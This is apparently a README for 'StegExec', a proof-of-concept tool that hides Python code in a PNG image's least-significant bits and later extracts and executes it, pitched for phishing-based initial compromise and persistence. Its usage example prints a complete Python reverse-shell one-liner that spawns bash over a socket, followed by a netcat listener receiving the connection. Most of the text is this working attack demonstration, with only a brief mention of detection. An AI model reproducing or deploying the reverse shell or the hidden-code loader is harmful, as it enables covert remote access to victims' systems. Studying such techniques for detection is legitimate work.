## StegExec

This is a PoC of how potentially malicious code may be hidden in an image file to then be executed within an innocent program. Its approach is to change the least-significant bit of an image file to write Python code which can then later be extracted and executed from the encoded image.

Under the right conditions, it is possible to use this approach to gain initial compromise (through phishing) or to establish persistence, so prepare accordingly with tools to check files hidden within images to prevent this sort of attack. Not all tools (e.g. steghide) support checking PNG files for embedded files, which this tool implements.

The code is well-documented with verbose output for demonstration purposes. For example, to encode a Python reverse shell:

```bash

$ python stegexec.py -e -f test.py image.png
[*] Script needs an image of at least 1656 pixels for it to fit.
[*] Image is 1189x676 or 803764 pixels.
[*] Script in binary:
 01101001011011010111000001101111011100100111010<SNIP>
[*] Now encoding into image...
[+] Script encoded
[*] Saving message as image_encoded.png
[+] Encoded image saved

$ python stegexec.py -x image_encoded.png
[*] Attempting to read image for script...
[+] Image read OK
[*] Extracting pixel information...
[+] Pixel information extracted.
[*] Decoding script in pixels...
[*] Extracting contents...
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("127.0.0.1",9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")

$ python stegexec.py -r image_encoded.png
[*] Attempting to read image for script...
[+] Image read OK
[*] Extracting pixel information...
[+] Pixel information extracted.
[*] Decoding script in pixels...
[*] Executing...

# Setting up a netcat listener, we get a connection
$ nc -lvnp 9001
listening on [any] 9001 ...
connect to [127.0.0.1] from (UNKNOWN) [127.0.0.1] 42888

```

## About and Usage

This tool was originally made to send, receive, and decode simple messages as images. This project is a PoC of how such a simple concept can be easily weaponized, that's all. I'm not liable for your use of this program.